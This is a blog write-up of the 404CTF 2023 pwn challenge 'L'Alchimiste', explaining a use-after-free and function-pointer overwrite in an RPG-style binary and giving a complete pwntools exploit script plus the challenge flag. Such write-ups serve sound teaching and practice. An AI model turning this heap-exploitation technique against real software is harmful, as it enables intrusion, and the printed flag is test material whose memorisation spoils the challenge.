---
layout: post
title: 404CTF 2023 | L'Alchimiste
image: /assets/images/404ctf/l-alchimiste/cover.png
date: 2023-06-07 01:20:00
categories: [404ctf, pwn]
---

This challenge was part of the [404CTF 2023](https://www.404ctf.fr/), organized by the General Directorate for External Security (DGSE) and Télécom SudParis.

# Challenge Description

![Challenge Description]({{site.baseurl}}/assets/images/404ctf/l-alchimiste/description.png)

The given file shows us a RPG-like prompt, where we can take some actions. The goal seems to be to show the alchemist our value, and we can already guess with the prompt that the exploit will be triggered by the fifth choice.

![Program prompt]({{site.baseurl}}/assets/images/404ctf/l-alchimiste/program.png)

# Reverse Engineering

Let's start by reversing the file on [Ghidra](https://ghidra-sre.org/). The binary contains debug symbols, so it is pretty straightforward. In the main function, a character is created and passed to each chosen function.

Looking at how are implemented the `showStats` and `buyStrUpPotion` functions, we deduce that our character is a structure containing 4 fields : 
 - `str`
 - `int`
 - `gold`
 - a pointer to a structure initialized as `NULL`, that we will identify later


<div class="row-container">
<div class="flex-2">

In order to get the flag, our character needs to have at least 150 of strength and intelligence. Unfortunately, we only have 100 gold and we cannot buy intelligence potions... We will have to use our own intelligence and a **Use-After-Free** to do so !	

</div>
<div>

![view_flag function]({{site.baseurl}}/assets/images/404ctf/l-alchimiste/view_flag.png)

</div>
</div>

# Analysis

Looking at how a potion is created, we deduce that a potion is another struct containing a `char[64]` array followed by a pointer to the function that will be executed when used.

![buyStrUpPotion function]({{site.baseurl}}/assets/images/404ctf/l-alchimiste/potion.png)

In this function, we note that `malloc` is always executed, even if we don't have enough gold.

![useItem function]({{site.baseurl}}/assets/images/404ctf/l-alchimiste/useItem.png)

Here `free` is called but the pointer reference will still be there !

Looking at those functions, a classic Use-After-Free comes out : if we buy a potion and use it a first time, we will then be able to repeat it to call `incStr` even if we don't have gold.
> Note that we have to call `malloc` again because else the double call to `free` will be detected and the program will crash.

___

In order to increase our strength, we just have to spam `buyStrUpPotion` and `useItem` :)

___
<br/>


As we're still unable to increase our intelligence, let's look further in the code. There is another option which allows us to send a message to the alchemist :

<div class="row-container column-reverse">
<div class="flex-2">

In this function, a buffer is allocated on the heap and we can write arbitrary data to it. Using this ability with the previous **Use-After-Free**, we can overwrite a freed potion and choose the function which will be called when used.

</div>
<div>

![sendMessage function]({{site.baseurl}}/assets/images/404ctf/l-alchimiste/sendMessage.png)

</div>
</div>


<div class="row-container">
<div>

![incInt function]({{site.baseurl}}/assets/images/404ctf/l-alchimiste/incInt.png)

</div>
<div class="flex-2">

Looking at the assembly code, and defined functions, we can observe that an `incInt` function is present in the binary, even if it is not called anywhere. This will make exploitation even easier for us, as this is exactly what we want to achieve.

</div>
</div>

As PIE is not enabled, the address of this function will not be random, we can find it at `0x4008d5`.

![Checksec output]({{site.baseurl}}/assets/images/404ctf/l-alchimiste/checksec.png)



# Exploit

As always, I used [pwntools](https://docs.pwntools.com/en/stable/), which makes communication with the process easier.

```py
#!/usr/bin/python3

from pwn import *

REMOTE = True
if REMOTE:
	p = remote('challenges.404ctf.fr', 30944)
else:
	p = process('./l_alchimiste')
	input('Press [ENTER] to continue...')

"""
1: buyStrUpPotion(character); MALLOC
2: useItem(character); FREE
3: sendMessage();
4: showStats(character);
5: view_flag(character);
6: break;
"""

INC_INT = 0x4008d5

def upStr():
	p.send(b'1\n') # Potion
	p.recvuntil(b'***** ~ ')
	addr = p.recvuntil(b'\n').rstrip(b'\n')
	print(f"[+] Potion address {addr.decode()}")
	p.recvuntil(b'>>> ')
	p.send(b'2\n') # FREE
	p.recvuntil(b'>>> ')

def upInt():
	p.send(b'1\n') # Potion
	p.recvuntil(b'***** ~ ')
	addr = p.recvuntil(b'\n').rstrip(b'\n')
	print(f"[+] Potion address {addr.decode()}")
	p.recvuntil(b'>>> ')
	p.send(b'2\n') # FREE
	p.recvuntil(b'>>> ')

	payload = b'A' * int(64)
	payload += p64(INC_INT)

	p.send(b'3\n') # Send message
	p.recvuntil(b'[Vous] ')
	p.send(payload + b'\n')
	p.recvuntil(b'***** ~ ')
	addr = p.recvuntil(b'\n').rstrip(b'\n')
	print(f"[+] Message address {addr.decode()}")
	p.recvuntil(b'>>> ')
	p.send(b'2\n') # FREE
	p.recvuntil(b'>>> ')
	#p.send(b'4\n') # SHOW
	#print(p.recvuntil(b'>>> ').decode())

p.recvuntil(b'>>> ')
upStr()
upStr()
upStr()

upInt()
upInt()
upInt()
upInt()
upInt()
upInt()
upInt()
upInt()
upInt()
upInt()
p.send(b'4\n') # SHOW
print(p.recvuntil(b'>>> ').decode())

p.send(b'5\n')
sleep(2)
print(p.recv())
```

![expl.py output]({{site.baseurl}}/assets/images/404ctf/l-alchimiste/expl-output.png)

> ✅ Flag : `404CTF{P0UrQU01_P4Y3r_QU4ND_135_M075_5UFF153N7}`